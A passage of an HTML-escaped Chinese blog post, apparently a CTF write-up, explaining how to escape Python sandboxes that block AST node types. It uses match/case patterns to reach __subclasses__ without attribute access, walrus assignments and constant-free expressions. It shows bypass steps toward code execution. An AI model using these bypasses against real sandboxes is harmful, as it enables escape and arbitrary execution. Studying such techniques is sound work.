Two&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;还可以匹配并自动赋值给局部变量，传入 (1,2) 时，会进入第二个分支，并对 x,y 赋值。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;item = (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;match&lt;/span&gt; item:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; (x, y, z):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;&lt;span class=&#34;subst&#34;&gt;&amp;#123;x&amp;#125;&lt;/span&gt; &lt;span class=&#34;subst&#34;&gt;&amp;#123;y&amp;#125;&lt;/span&gt; &lt;span class=&#34;subst&#34;&gt;&amp;#123;z&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; (x, y):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;&lt;span class=&#34;subst&#34;&gt;&amp;#123;x&amp;#125;&lt;/span&gt; &lt;span class=&#34;subst&#34;&gt;&amp;#123;y&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; (x,):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;&lt;span class=&#34;subst&#34;&gt;&amp;#123;x&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;对于基本类型的匹配比较好理解，下面是一个匹配类的示例：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;AClass&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, value&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.thing = value&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;item = AClass(&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;match&lt;/span&gt; item:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; AClass(thing=x):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;Got &lt;span class=&#34;subst&#34;&gt;&amp;#123;x = &amp;#125;&lt;/span&gt;!&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Got x = 32!&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;在这个示例中，重点关注 &lt;code&gt;case AClass(thing=x)&lt;/code&gt; ，这里的含义并非是将 x 赋值给 thing，我们需要将其理解为一个表达式，表示匹配类型为 AClass 且存在 thing 属性的对象，并且 &lt;strong&gt;thing 属性值自动赋值给 x。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这样一来就可以在不适用。号的情况下获取到类的属性值。例如获取  &lt;code&gt;&#39;&#39;.__class__&lt;/code&gt; ，可以编写如下的 match/case 语句：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;match&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(__class__=x):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(x==&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;可以看到 x 就是  &lt;code&gt;&#39;&#39;.__class__&lt;/code&gt; . 因为所有的类都输入 object 类，所以可以使用 object 来替代 str，这样就无需关注匹配到的到底是哪个类。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;match&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;object&lt;/span&gt;(__class__=x):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(x==&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;再测试一下该 payload 的 AST：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ast &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;match str():&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    case str(__class__=x):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        print(x)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(ast.dump(ast.parse(a, mode=&lt;span class=&#34;string&#34;&gt;&amp;#x27;exec&amp;#x27;&lt;/span&gt;), indent=&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;AST 如下：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Module(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    body=[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Match(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            subject=Call(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                func=Name(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;, ctx=Load()),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                args=[],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                keywords=[]),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            cases=[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                match_case(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    pattern=MatchClass(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        cls=Name(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;, ctx=Load()),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        patterns=[],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        kwd_attrs=[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;string&#34;&gt;&amp;#x27;__class__&amp;#x27;&lt;/span&gt;],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        kwd_patterns=[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            MatchAs(name=&lt;span class=&#34;string&#34;&gt;&amp;#x27;x&amp;#x27;&lt;/span&gt;)]),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    body=[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Expr(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            value=Call(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                func=Name(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;print&amp;#x27;&lt;/span&gt;, ctx=Load()),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                args=[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    Name(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;x&amp;#x27;&lt;/span&gt;, ctx=Load())],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                keywords=[]))])])],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    type_ignores=[])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;可以看到确实没有 Attribute，依据这个原理，就可以绕过 ast.Attribute&lt;/p&gt;
&lt;p&gt;我们可以构造替代  &lt;code&gt;&#39;&#39;.__class__.__base__.__subclasses__()&lt;/code&gt;  的 payload：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;match str():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    case object(__class__=clazz):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        match clazz:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            case object(__base__=bass):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                match bass:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    case object(__subclasses__=subclazz):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        print(subclazz)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;绕过-astassign-赋值变量&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过-astassign-赋值变量&#34;&gt;#&lt;/a&gt; 绕过 ast.Assign 赋值变量&lt;/h4&gt;
&lt;p&gt;ast.Assign 无法使用时，我们无法直接使用 = 来进行赋值，此时可以使用海象表达式:= 进行绕过。例如：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    system:=&lt;span class=&#34;number&#34;&gt;111&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bash:=&lt;span class=&#34;number&#34;&gt;222&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;此时 AST 树如下，海象表达式用到的是 ast.NamedExpr 而非 ast.Assign&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Module(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    body=[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Expr(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            value=&lt;span class=&#34;type&#34;&gt;List&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                elts=[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    NamedExpr(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        target=Name(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;, ctx=Store()),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        value=Constant(value=&lt;span class=&#34;number&#34;&gt;111&lt;/span&gt;)),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    NamedExpr(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        target=Name(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;bash&amp;#x27;&lt;/span&gt;, ctx=Store()),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        value=Constant(value=&lt;span class=&#34;number&#34;&gt;222&lt;/span&gt;))],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ctx=Load()))],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    type_ignores=[])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;绕过-astconstant-获取数字-字符串&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过-astconstant-获取数字-字符串&#34;&gt;#&lt;/a&gt; 绕过 ast.Constant 获取数字、字符串&lt;/h4&gt;
&lt;p&gt;题目限制了 ast.Constant，所以无法直接使用数字、字符串常量，但通过其他的函数组合可以构造出数字和字符串。 例如：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; : &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;  : &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;([])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;: &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;([]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;: &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;([&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;()])) 或 &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;([&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;: &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;([&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(),&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;()])) 或 &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;([&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;max&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 